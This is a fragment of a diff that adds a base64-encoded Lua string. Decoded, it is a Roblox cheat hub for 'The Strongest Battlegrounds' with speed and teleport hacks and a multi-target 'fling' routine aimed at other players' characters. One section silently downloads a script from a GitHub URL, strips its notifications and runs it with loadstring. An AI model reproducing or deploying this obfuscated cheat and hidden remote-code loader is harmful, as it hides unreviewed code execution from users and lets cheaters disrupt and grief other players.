+.."aXRib3guWkluZGV4ICAgICAgICAgICAgICAgICA9IDUKICAgICAgICAgICAgICAgIGhpdGJveC5Nb3VzZUJ1dHRvbjFEb3duOkNv
+.."bm5lY3QoZnVuY3Rpb24oKSBzbGlkaW5nID0gdHJ1ZSBlbmQpCiAgICAgICAgICAgICAgICBVc2VySW5wdXRTZXJ2aWNlLklucHV0
+.."Q2hhbmdlZDpDb25uZWN0KGZ1bmN0aW9uKGlucCkKICAgICAgICAgICAgICAgICAgICBpZiBzbGlkaW5nIGFuZCBpbnAuVXNlcklu
+.."cHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuTW91c2VNb3ZlbWVudCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxv
+.."Y2FsIGFicyA9IHRyYWNrQkcuQWJzb2x1dGVQb3NpdGlvbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB3ICAgPSB0cmFj
+.."a0JHLkFic29sdXRlU2l6ZS5YCiAgICAgICAgICAgICAgICAgICAgICAgIHNldFNWYWwock1pbiArIChyTWF4LXJNaW4pICogbWF0
+.."aC5jbGFtcCgoaW5wLlBvc2l0aW9uLlgtYWJzLlgpL3csIDAsIDEpKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAg
+.."ICAgICAgZW5kKQogICAgICAgICAgICAgICAgVXNlcklucHV0U2VydmljZS5JbnB1dEVuZGVkOkNvbm5lY3QoZnVuY3Rpb24oaW5w
+.."KQogICAgICAgICAgICAgICAgICAgIGlmIGlucC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRv
+.."bjEgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBzbGlkaW5nID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBlbmQKICAg
+.."ICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGxvY2FsIHNsT2JqID0ge30KICAgICAgICAgICAgICAgIGZ1bmN0aW9u
+.."IHNsT2JqOlNldFZhbHVlKHYpIHNldFNWYWwodikgZW5kCiAgICAgICAgICAgICAgICByZXR1cm4gc2xPYmoKICAgICAgICAgICAg
+.."ZW5kCgogICAgICAgICAgICByZXR1cm4gdGFiCiAgICAgICAgZW5kIC0tIENyZWF0ZVRhYgoKICAgICAgICByZXR1cm4gd2luCiAg
+.."ICBlbmQgLS0gQ3JlYXRlV2luZG93CgogICAgLS0g4pSA4pSAIE5vdGlmeSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIAKICAgIGZ1bmN0aW9uIGxpYjpOb3RpZnkob3B0cykKICAgICAgICBvcHRzID0gb3B0cyBvciB7fQogICAgICAg
+.."IGxvY2FsIG50aXRsZSAgID0gb3B0cy5UaXRsZSAgICBvciAiTm90aWZpY2F0aW9uIgogICAgICAgIGxvY2FsIG5jb250ZW50ID0g
+.."b3B0cy5Db250ZW50ICBvciAiIgogICAgICAgIGxvY2FsIG5kdXIgICAgID0gb3B0cy5EdXJhdGlvbiBvciA0CgogICAgICAgIGxv
+.."Y2FsIG4gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgTm90aWZGcmFtZSkKICAgICAgICBuLlNpemUgICAgICAgICAgICAgPSBVRGlt
+.."Mi5uZXcoMSwgMCwgMCwgNTYpCiAgICAgICAgbi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjIsIDIyLCAyOCkK
+.."ICAgICAgICBuLkJvcmRlclNpemVQaXhlbCAgPSAwCiAgICAgICAgbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAg
+.."IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBuKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA4KQogICAgICAgIGxvY2FsIG5T
+.."ID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIsIG4pCiAgICAgICAgblMuVGhpY2tuZXNzICAgID0gMQogICAgICAgIG5TLkNvbG9y
+.."ICAgICAgICA9IENfQUNDRU5UCiAgICAgICAgblMuVHJhbnNwYXJlbmN5ID0gMQoKICAgICAgICBsb2NhbCBudGwgPSBJbnN0YW5j
+.."ZS5uZXcoIlRleHRMYWJlbCIsIG4pCiAgICAgICAgbnRsLlNpemUgICAgICAgICAgICAgICAgICAgPSBVRGltMi5uZXcoMSwgLTEw
+.."LCAwLCAyMikKICAgICAgICBudGwuUG9zaXRpb24gICAgICAgICAgICAgICA9IFVEaW0yLm5ldygwLCA4LCAwLCA0KQogICAgICAg
+.."IG50bC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIG50bC5UZXh0ICAgICAgICAgICAgICAgICAgID0gbnRpdGxl
+.."CiAgICAgICAgbnRsLlRleHRDb2xvcjMgICAgICAgICAgICAgPSBDX1RFWFQKICAgICAgICBudGwuRm9udCAgICAgICAgICAgICAg
+.."ICAgICA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgbnRsLlRleHRTaXplICAgICAgICAgICAgICAgPSAxMgogICAgICAg
+.."IG50bC5UZXh0WEFsaWdubWVudCAgICAgICAgID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CiAgICAgICAgbnRsLlRleHRUcmFu
+.."c3BhcmVuY3kgICAgICAgPSAxCgogICAgICAgIGxvY2FsIG5jbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgbikKICAgICAg
+.."ICBuY2wuU2l6ZSAgICAgICAgICAgICAgICAgICA9IFVEaW0yLm5ldygxLCAtMTAsIDAsIDIyKQogICAgICAgIG5jbC5Qb3NpdGlv
+.."biAgICAgICAgICAgICAgID0gVURpbTIubmV3KDAsIDgsIDAsIDI2KQogICAgICAgIG5jbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5
+.."ID0gMQogICAgICAgIG5jbC5UZXh0ICAgICAgICAgICAgICAgICAgID0gbmNvbnRlbnQKICAgICAgICBuY2wuVGV4dENvbG9yMyAg
+.."ICAgICAgICAgICA9IENfU1VCCiAgICAgICAgbmNsLkZvbnQgICAgICAgICAgICAgICAgICAgPSBFbnVtLkZvbnQuR290aGFtCiAg
+.."ICAgICAgbmNsLlRleHRTaXplICAgICAgICAgICAgICAgPSAxMQogICAgICAgIG5jbC5UZXh0WEFsaWdubWVudCAgICAgICAgID0g
+.."RW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CiAgICAgICAgbmNsLlRleHRXcmFwcGVkICAgICAgICAgICAgPSB0cnVlCiAgICAgICAg
+.."bmNsLlRleHRUcmFuc3BhcmVuY3kgICAgICAgPSAxCgogICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUobiwgICBUd2VlbkluZm8u
+.."bmV3KDAuMyksIHsgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAgfSk6UGxheSgpCiAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0
+.."ZShuUywgIFR3ZWVuSW5mby5uZXcoMC4zKSwgeyBUcmFuc3BhcmVuY3kgPSAwIH0pOlBsYXkoKQogICAgICAgIFR3ZWVuU2Vydmlj
+.."ZTpDcmVhdGUobnRsLCBUd2VlbkluZm8ubmV3KDAuMyksIHsgVGV4dFRyYW5zcGFyZW5jeSA9IDAgfSk6UGxheSgpCiAgICAgICAg
+.."VHdlZW5TZXJ2aWNlOkNyZWF0ZShuY2wsIFR3ZWVuSW5mby5uZXcoMC4zKSwgeyBUZXh0VHJhbnNwYXJlbmN5ID0gMCB9KTpQbGF5
+.."KCkKCiAgICAgICAgdGFzay5kZWxheShuZHVyLCBmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCAobiBhbmQgbi5QYXJlbnQp
+.."IHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKG4sICAgVHdlZW5JbmZvLm5ldygwLjM1KSwg
+.."eyBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMSB9KTpQbGF5KCkKICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShuUywg
+.."IFR3ZWVuSW5mby5uZXcoMC4zNSksIHsgVHJhbnNwYXJlbmN5ID0gMSB9KTpQbGF5KCkKICAgICAgICAgICAgVHdlZW5TZXJ2aWNl
+.."OkNyZWF0ZShudGwsIFR3ZWVuSW5mby5uZXcoMC4zNSksIHsgVGV4dFRyYW5zcGFyZW5jeSA9IDEgfSk6UGxheSgpCiAgICAgICAg
+.."ICAgIFR3ZWVuU2VydmljZTpDcmVhdGUobmNsLCBUd2VlbkluZm8ubmV3KDAuMzUpLCB7IFRleHRUcmFuc3BhcmVuY3kgPSAxIH0p
+.."OlBsYXkoKQogICAgICAgICAgICB0YXNrLmRlbGF5KDAuNCwgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgaWYgbiBhbmQgbi5Q
+.."YXJlbnQgdGhlbiBuOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZCkKICAgIGVuZAoKICAgIHJldHVy
+.."biBsaWIKZW5kCgpsb2NhbCBSYXlmaWVsZCA9IE1ha2VCYXNpY0h1YkxpYigpCgpsb2NhbCBXaW5kb3cgPSBSYXlmaWVsZDpDcmVh
+.."dGVXaW5kb3coewogICAgTmFtZSA9ICJCYXNpY0h1YiB8IFRoZSBTdHJvbmdlc3QgQmF0dGxlZ3JvdW5kcyIsCn0pCgotLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi0t
+.."IEVNT1RFRklYIOKAlCBhdXRvLXJ1biBzaWxlbnRseSAobm8gbG9hZGluZyBHVUksIG5vIG5vdGlmaWNhdGlvbnMpCi0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KdGFz
+.."ay5zcGF3bihmdW5jdGlvbigpCiAgICB0YXNrLndhaXQoMykKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBzcmMg
+.."PSBnYW1lOkh0dHBHZXQoCiAgICAgICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vS0hBVEFSU0lTWlgv
+.."TmV3L3JlZnMvaGVhZHMvbWFpbi9FbW90ZVN0dWZmL0Vtb3RlRml4Lmx1YSIKICAgICAgICApCiAgICAgICAgLS0gUmVtb3ZlIGxv
+.."YWRpbmcgU2NyZWVuR3VpOiBwcmV2ZW50IGl0IGJlaW5nIHBhcmVudGVkIHRvIENvcmVHdWkKICAgICAgICBzcmMgPSBzcmM6Z3N1
+.."Yigic2NyZWVuJS5QYXJlbnQlcyo9JXMqQ0ciLCAiLS0gc2NyZWVuIHN1cHByZXNzZWQiKQogICAgICAgIC0tIFNpbGVuY2UgYWxs
+.."IFN0YXJ0ZXJHdWkgbm90aWZpY2F0aW9ucyBieSByZXBsYWNpbmcgU0cgc2VydmljZSB3aXRoIGEgbW9jawogICAgICAgIHNyYyA9
+.."IHNyYzpnc3ViKAogICAgICAgICAgICAnbG9jYWwgU0clcyo9JXMqZ2FtZTpHZXRTZXJ2aWNlJSgiU3RhcnRlckd1aSIlKScsCiAg
+.."ICAgICAgICAgICdsb2NhbCBTRyA9IHNldG1ldGF0YWJsZSh7fSx7X19pbmRleD1mdW5jdGlvbigpcmV0dXJuIGZ1bmN0aW9uKCll
+.."bmQgZW5kfSknCiAgICAgICAgKQogICAgICAgIGxvYWRzdHJpbmcoc3JjKSgpCiAgICBlbmQpCmVuZCkKCgoKLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQotLSBTUEVF
+.."RCAvIFRFTEVQT1JUIFNUQVRFCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KbG9jYWwgdHNwZWVkICAgPSAwLjEKbG9jYWwgdHB3YWxraW5nID0gZmFsc2UKClJ1blNl
+.."cnZpY2UuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oKQogICAgaWYgdHB3YWxraW5nIGFuZCBjaGFyYWN0ZXIgYW5kIGh1bWFu
+.."b2lkIGFuZCBodW1hbm9pZFJvb3RQYXJ0IHRoZW4KICAgICAgICBpZiBodW1hbm9pZC5Nb3ZlRGlyZWN0aW9uLk1hZ25pdHVkZSA+
+.."IDAgdGhlbgogICAgICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCiAgICAg
+.."ICAgICAgICAgICArIChodW1hbm9pZC5Nb3ZlRGlyZWN0aW9uICogdHNwZWVkKQogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCi0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0KLS0gRkxJTkcgTE9HSUMgIChTa2lkRmxpbmcgZnJvbSBLMUxBUzFLJ3MgTXVsdGktVGFyZ2V0IEZsaW5nKQotLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmxvY2Fs
+.."IEJIX09sZFBvcyAgID0gbmlsCmxvY2FsIEJIX0ZQREggICAgID0gd29ya3NwYWNlLkZhbGxlblBhcnRzRGVzdHJveUhlaWdodAps
+.."b2NhbCBGbGluZ0FjdGl2ZSA9IGZhbHNlCgpsb2NhbCBmdW5jdGlvbiBTa2lkRmxpbmcoVGFyZ2V0UGxheWVyKQogICAgbG9jYWwg
+.."Q2hhciAgICAgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGxvY2FsIEh1bSAgICAgID0gQ2hhciBhbmQgQ2hhcjpGaW5kRmly
+.."c3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgIGxvY2FsIFJvb3RQYXJ0ID0gSHVtIGFuZCBIdW0uUm9vdFBhcnQKICAgIGlm
+.."IG5vdCAoQ2hhciBhbmQgSHVtIGFuZCBSb290UGFydCkgdGhlbiByZXR1cm4gZW5kCgogICAgbG9jYWwgVENoYXIgICAgPSBUYXJn
+.."ZXRQbGF5ZXIuQ2hhcmFjdGVyCiAgICBpZiBub3QgVENoYXIgdGhlbiByZXR1cm4gZW5kCgogICAgbG9jYWwgVEh1bSAgICAgPSBU
+.."Q2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgIGxvY2FsIFRSb290ICAgID0gVEh1bSBhbmQgVEh1bS5S
+.."b290UGFydAogICAgbG9jYWwgVEhlYWQgICAgPSBUQ2hhcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpCiAgICBsb2NhbCBBY2MgICAg
+.."ICA9IFRDaGFyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiQWNjZXNzb3J5IikKICAgIGxvY2FsIEhhbmRsZSAgID0gQWNjIGFuZCBB
+.."Y2M6RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpCgogICAgaWYgUm9vdFBhcnQuVmVsb2NpdHkuTWFnbml0dWRlIDwgNTAgdGhlbgog
+.."ICAgICAgIEJIX09sZFBvcyA9IFJvb3RQYXJ0LkNGcmFtZQogICAgZW5kCgogICAgaWYgVEh1bSBhbmQgVEh1bS5TaXQgdGhlbiBy
+.."ZXR1cm4gZW5kCgogICAgLS0gQ2FtZXJhIGZvbGxvdyB0YXJnZXQKICAgIGlmIFRIZWFkIHRoZW4KICAgICAgICB3b3Jrc3BhY2Uu
+.."Q3VycmVudENhbWVyYS5DYW1lcmFTdWJqZWN0ID0gVEhlYWQKICAgIGVsc2VpZiBIYW5kbGUgdGhlbgogICAgICAgIHdvcmtzcGFj
+.."ZS5DdXJyZW50Q2FtZXJhLkNhbWVyYVN1YmplY3QgPSBIYW5kbGUKICAgIGVsc2VpZiBUSHVtIGFuZCBUUm9vdCB0aGVuCiAgICAg
+.."ICAgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IFRIdW0KICAgIGVuZAoKICAgIGlmIG5vdCBUQ2hhcjpG
+.."aW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJCYXNlUGFydCIpIHRoZW4gcmV0dXJuIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIEZQb3Mo
+.."QmFzZVBhcnQsIFBvcywgQW5nKQogICAgICAgIFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoQmFzZVBhcnQuUG9zaXRpb24p
+.."ICogUG9zICogQW5nCiAgICAgICAgQ2hhcjpTZXRQcmltYXJ5UGFydENGcmFtZShDRnJhbWUubmV3KEJhc2VQYXJ0LlBvc2l0aW9u
+.."KSAqIFBvcyAqIEFuZykKICAgICAgICBSb290UGFydC5WZWxvY2l0eSAgICA9IFZlY3RvcjMubmV3KDllNywgOWU3ICogMTAsIDll
+.."NykKICAgICAgICBSb290UGFydC5Sb3RWZWxvY2l0eSA9IFZlY3RvcjMubmV3KDllOCwgOWU4LCA5ZTgpCiAgICBlbmQKCiAgICBs
+.."b2NhbCBmdW5jdGlvbiBTRkJhc2VQYXJ0KEJhc2VQYXJ0KQogICAgICAgIGxvY2FsIFRpbWVUb1dhaXQgPSAyCiAgICAgICAgbG9j
+.."YWwgVGltZSAgICAgICA9IHRpY2soKQogICAgICAgIGxvY2FsIEFuZ2xlICAgICAgPSAwCiAgICAgICAgcmVwZWF0CiAgICAgICAg
+.."ICAgIGlmIFJvb3RQYXJ0IGFuZCBUSHVtIHRoZW4KICAgICAgICAgICAgICAgIGlmIEJhc2VQYXJ0LlZlbG9jaXR5Lk1hZ25pdHVk
+.."ZSA8IDUwIHRoZW4KICAgICAgICAgICAgICAgICAgICBBbmdsZSA9IEFuZ2xlICsgMTAwCiAgICAgICAgICAgICAgICAgICAgRlBv
+.."cyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLDEuNSwwKSArIFRIdW0uTW92ZURpcmVjdGlvbiAqIEJhc2VQYXJ0LlZlbG9jaXR5Lk1h
+.."Z25pdHVkZS8xLjI1LCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKEFuZ2xlKSwwLDApKQogICAgICAgICAgICAgICAgICAgIHRhc2su
+.."d2FpdCgpCiAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLC0xLjUsMCkgKyBUSHVtLk1vdmVE
+.."aXJlY3Rpb24gKiBCYXNlUGFydC5WZWxvY2l0eS5NYWduaXR1ZGUvMS4yNSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZSks
+.."MCwwKSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQsIENG
+.."cmFtZS5uZXcoMCwxLjUsMCkgKyBUSHVtLk1vdmVEaXJlY3Rpb24sIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGUpLDAsMCkp
+.."CiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUu
+.."bmV3KDAsLTEuNSwwKSArIFRIdW0uTW92ZURpcmVjdGlvbiwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZSksMCwwKSkKICAg
+.."ICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIEZQb3Mo
+.."QmFzZVBhcnQsIENGcmFtZS5uZXcoMCwxLjUsVEh1bS5XYWxrU3BlZWQpLCAgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZCg5MCksMCww
+.."KSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQsIENGcmFt
+.."ZS5uZXcoMCwtMS41LC1USHVtLldhbGtTcGVlZCksQ0ZyYW1lLkFuZ2xlcygwLDAsMCkpCiAgICAgICAgICAgICAgICAgICAgdGFz
+.."ay53YWl0KCkKICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDAsMS41LFRIdW0uV2Fsa1NwZWVk
+.."KSwgIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoOTApLDAsMCkpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAg
+.."ICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDAsLTEuNSwwKSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZCg5
+.."MCksMCwwKSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQs
+.."IENGcmFtZS5uZXcoMCwtMS41LDApLCBDRnJhbWUuQW5nbGVzKDAsMCwwKSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQo
+.."KQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIHVudGlsIFRpbWUgKyBUaW1lVG9XYWl0IDwgdGlj
+.."aygpIG9yIG5vdCBGbGluZ0FjdGl2ZQogICAgZW5kCgogICAgd29ya3NwYWNlLkZhbGxlblBhcnRzRGVzdHJveUhlaWdodCA9IDAv
+.."MAoKICAgIGxvY2FsIEJWID0gSW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiKQogICAgQlYuUGFyZW50ICAgPSBSb290UGFydAog
+.."ICAgQlYuVmVsb2NpdHkgID0gVmVjdG9yMy5uZXcoMCwwLDApCiAgICBCVi5NYXhGb3JjZSAgPSBWZWN0b3IzLm5ldyg5ZTksOWU5
+.."LDllOSkKCiAgICBIdW06U2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuU2VhdGVkLCBmYWxzZSkKCiAgICBp
+.."ZiAgICAgVFJvb3QgIHRoZW4gU0ZCYXNlUGFydChUUm9vdCkKICAgIGVsc2VpZiBUSGVhZCAgdGhlbiBTRkJhc2VQYXJ0KFRIZWFk
+.."KQogICAgZWxzZWlmIEhhbmRsZSB0aGVuIFNGQmFzZVBhcnQoSGFuZGxlKQogICAgZW5kCgogICAgQlY6RGVzdHJveSgpCiAgICBI
+.."dW06U2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuU2VhdGVkLCB0cnVlKQogICAgd29ya3NwYWNlLkN1cnJl
+.."bnRDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IEh1bQoKICAgIGlmIEJIX09sZFBvcyB0aGVuCiAgICAgICAgcmVwZWF0CiAgICAgICAg
+.."ICAgIFJvb3RQYXJ0LkNGcmFtZSA9IEJIX09sZFBvcyAqIENGcmFtZS5uZXcoMCwuNSwwKQogICAgICAgICAgICBDaGFyOlNldFBy
+.."aW1hcnlQYXJ0Q0ZyYW1lKEJIX09sZFBvcyAqIENGcmFtZS5uZXcoMCwuNSwwKSkKICAgICAgICAgICAgSHVtOkNoYW5nZVN0YXRl
+.."KCJHZXR0aW5nVXAiKQogICAgICAgICAgICBmb3IgXywgcGFydCBpbiBwYWlycyhDaGFyOkdldENoaWxkcmVuKCkpIGRvCiAgICAg
+.."ICAgICAgICAgICBpZiBwYXJ0OklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcGFydC5WZWxvY2l0eSA9
+.."IFZlY3RvcjMubmV3KCkKICAgICAgICAgICAgICAgICAgICBwYXJ0LlJvdFZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoKQogICAgICAg
+.."ICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIHVudGlsIChSb290UGFy
+.."dC5Qb3NpdGlvbiAtIEJIX09sZFBvcy5wKS5NYWduaXR1ZGUgPCAyNQogICAgICAgIHdvcmtzcGFjZS5GYWxsZW5QYXJ0c0Rlc3Ry
+.."b3lIZWlnaHQgPSBCSF9GUERICiAgICBlbmQKZW5kCgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi0tIEZMSU5HIEdVSSAgKHNlcGFyYXRlIGRyYWdnYWJsZSBTY3Jl
+.."ZW5HdWksIG9wZW5lZCBmcm9tIFJheWZpZWxkIGJ1dHRvbikKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpsb2NhbCBGbGluZ1NlbGVjdGVkVGFyZ2V0cyA9IHt9Cmxv
+.."Y2FsIEZsaW5nUGxheWVyQ2hlY2tib3hlcyA9IHt9CmxvY2FsIEZsaW5nVGhyZWFkID0gbmlsCmxvY2FsIEZsaW5nR3VpID0gbmls
+.."Cgpsb2NhbCBmdW5jdGlvbiBDcmVhdGVGbGluZ0dVSSgpCiAgICAtLSBEZXN0cm95IG9sZCBHVUkgaWYgZXhpc3RzCiAgICBpZiBG
+.."bGluZ0d1aSBhbmQgRmxpbmdHdWkuUGFyZW50IHRoZW4gRmxpbmdHdWk6RGVzdHJveSgpIGVuZAoKICAgIGxvY2FsIGNvcmVHdWkg
+.."PSBnYW1lOkdldFNlcnZpY2UoIkNvcmVHdWkiKQogICAgbG9jYWwgcGFyZW50ICA9IHBjYWxsKGZ1bmN0aW9uKCkgcmV0dXJuIGNv
+.."cmVHdWkgZW5kKSBhbmQgY29yZUd1aSBvciBMb2NhbFBsYXllcjpXYWl0Rm9yQ2hpbGQoIlBsYXllckd1aSIpCgogICAgbG9jYWwg
+.."U2NyZWVuR3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQogICAgU2NyZWVuR3VpLk5hbWUgICAgICAgICAgID0gIkJIX0Zs
+.."aW5nR1VJIgogICAgU2NyZWVuR3VpLlJlc2V0T25TcGF3biAgID0gZmFsc2UKICAgIFNjcmVlbkd1aS5aSW5kZXhCZWhhdmlvciAg
+.."PSBFbnVtLlpJbmRleEJlaGF2aW9yLlNpYmxpbmcKICAgIHBjYWxsKGZ1bmN0aW9uKCkgU2NyZWVuR3VpLlBhcmVudCA9IGNvcmVH
+.."dWkgZW5kKQogICAgaWYgbm90IFNjcmVlbkd1aS5QYXJlbnQgdGhlbiBTY3JlZW5HdWkuUGFyZW50ID0gTG9jYWxQbGF5ZXI6V2Fp
+.."dEZvckNoaWxkKCJQbGF5ZXJHdWkiKSBlbmQKCiAgICBGbGluZ0d1aSA9IFNjcmVlbkd1aQoKICAgIC0tIE1haW4gZnJhbWUKICAg
+.."IGxvY2FsIE1haW4gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgU2NyZWVuR3VpKQogICAgTWFpbi5TaXplICAgICAgICAgICAgICA9
+.."IFVEaW0yLm5ldygwLCAzMjAsIDAsIDQwMCkKICAgIE1haW4uUG9zaXRpb24gICAgICAgICAgPSBVRGltMi5uZXcoMC41LCAtMTYw
+.."LCAwLjUsIC0yMDApCiAgICBNYWluLkJhY2tncm91bmRDb2xvcjMgID0gQ29sb3IzLmZyb21SR0IoMTgsIDE4LCAxOCkKICAgIE1h
+.."aW4uQm9yZGVyU2l6ZVBpeGVsICAgPSAwCiAgICBNYWluLkFjdGl2ZSAgICAgICAgICAgID0gdHJ1ZQogICAgTWFpbi5EcmFnZ2Fi
+.."bGUgICAgICAgICA9IHRydWUKICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBNYWluKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5l
+.."dygwLCAxMikKCiAgICBsb2NhbCBTdHJva2UgPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIiwgTWFpbikKICAgIFN0cm9rZS5UaGlj
+.."a25lc3MgPSAyCiAgICBTdHJva2UuQ29sb3IgICAgID0gQ29sb3IzLmZyb21SR0IoMjIwLCA1MCwgNTApCgogICAgLS0gVGl0bGUg
+.."YmFyCiAgICBsb2NhbCBUaXRsZUJhciA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBNYWluKQogICAgVGl0bGVCYXIuU2l6ZSAgICAg
